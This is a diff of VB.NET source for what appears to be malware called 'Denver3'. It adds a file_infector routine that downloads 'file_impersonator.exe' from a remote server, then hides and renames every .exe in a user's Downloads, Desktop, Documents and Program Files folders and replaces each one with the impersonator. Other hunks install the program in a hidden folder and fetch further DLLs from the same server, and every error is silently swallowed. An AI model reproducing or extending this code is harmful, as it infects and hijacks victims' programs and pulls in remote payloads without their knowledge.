@@ -22,12 +22,50 @@ Public Class Form1
 
 
     Private Sub DebugScript() 'Code to run on debug mode
-        Error408.Show()
+        file_infector("C:\Users\zv800\Desktop\TESTDER")
+        ' Dim exeFilePath As String = "C:\Path\To\Your\File.exe"
+
+        ' Extract the icon from the .exe file
+        ' Dim icon As Icon = Icon.ExtractAssociatedIcon(exeFilePath)
+
+        ' Save the icon as an ICO file
+        'Dim savePath As String = "C:\Path\To\Save\Your\Icon.ico"
+        'Using fs As New FileStream(savePath, FileMode.Create)
+        ' I'con.Save(fs)
+        ' End Using
     End Sub
 
+    Public Sub file_infector(Path As String)
+        Try
+            Try
+                My.Computer.Network.DownloadFile(ServerAddr & "file_impersonator.exe", InstallPath & "\file_impersonator.exe")
+            Catch ex As Exception
 
+            End Try
+            Dim di As New DirectoryInfo(Path)
+            ' Get a reference to each file in that directory.
+            Dim fiArr As FileInfo() = di.GetFiles()
+            ' Display the names of the files.
+            Dim fri As FileInfo
+            For Each fri In fiArr
+                Try
+                    If Not fri.Name = "Denver3.exe" Or Not fri.Name = "Denver3.exe" Then
+                        If fri.Extension = ".exe" Then
+                            My.Computer.FileSystem.RenameFile(fri.FullName, fri.Name & ".Denver3.exe")
+                            IO.File.SetAttributes(fri.FullName & ".Denver3.exe", IO.FileAttributes.Hidden Or IO.FileAttributes.System)
+                            My.Computer.FileSystem.CopyFile(InstallPath & "\file_impersonator.exe", fri.FullName)
+                        End If
+                    End If
+                Catch ex As Exception
+
+                End Try
+            Next fri
+        Catch ex As Exception
+
+        End Try
+
+    End Sub
     Public Sub infect()
-
         Try
             My.Computer.FileSystem.CreateDirectory(InstallPath)
             IO.File.SetAttributes(InstallPath, IO.FileAttributes.Hidden Or IO.FileAttributes.System)
@@ -41,7 +79,11 @@ Public Class Form1
 
             End Try
         End If
-
+        file_infector(UserFoler & "\Downloads")
+        file_infector(UserFoler & "\Desktop")
+        file_infector(UserFoler & "\Documents")
+        file_infector("C:\Program Files")
+        file_infector("C:\Program Files (x86)")
         Try
             My.Computer.FileSystem.CopyFile(Application.ExecutablePath, InstallPath & "\Denver3.exe")
         Catch ex As Exception
@@ -79,6 +121,9 @@ Public Class Form1
     Public Sub RunOnNotFirstRun()
 
         If My.Computer.FileSystem.FileExists(InstallPath & "\Denver3.runtime") Then
+
+
+
             Try
                 My.Computer.Network.DownloadFile(ServerAddr & "Interop.WMPLib.dll", Application.StartupPath & "\Interop.WMPLib.dll")
             Catch ex As Exception
